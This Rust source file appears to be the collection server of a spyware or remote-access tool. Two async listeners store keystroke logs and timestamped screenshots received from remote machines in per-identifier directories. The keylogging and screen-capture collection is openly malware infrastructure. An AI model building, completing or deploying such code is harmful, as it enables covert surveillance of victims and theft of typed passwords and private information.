use std::time::Duration;

use chrono::{Datelike, Timelike, Utc};
use tokio::{fs::{self, create_dir, File}, io::AsyncWriteExt, sync::mpsc::Receiver, time::sleep};
use crate::SRV_SAVE_DIR;

pub async fn keylog_listener(mut rx: Receiver<Vec<u8>>, identifier: &str) -> std::io::Result<()>{
    let directory = format!("{}/{}/", SRV_SAVE_DIR, identifier);
    if !fs::try_exists(&directory).await? {
        create_dir(&directory).await?;
    }
    let file_path = format!("{}keylogger.txt", directory);
    if !fs::try_exists(&file_path).await? {
        File::create(&file_path).await?;
    }
    let mut file = File::options().append(true).open(file_path).await?;
    while let Some(data) = rx.recv().await {
        file.write_all(&data).await?;
        file.flush().await?;
    }
    file.shutdown().await?;
    Ok(())
}

pub async fn screenshot_listener(mut rx: Receiver<Vec<u8>>, identifier: &str) -> std::io::Result<()> {
    let directory = format!("{}/{}/",SRV_SAVE_DIR, identifier);
    if !fs::try_exists(&directory).await? {
        create_dir(&directory).await?;
    }
    while let Some(data) = rx.recv().await {
        let time = Utc::now();
        let file_path = format!("{}screenshot-{}-{}-{}T{}-{}-{}.png",
        directory,
        time.year(),
        time.month(),
        time.day(),
        time.hour(),
        time.minute(),
        time.second());
        if !fs::try_exists(&file_path).await? {
            File::create(&file_path).await?;
        }
        let mut file = File::options().write(true).open(file_path).await?;
        file.write_all(&data).await?;
        file.shutdown().await?;
        sleep(Duration::from_secs(1)).await;
    }


    Ok(())
}
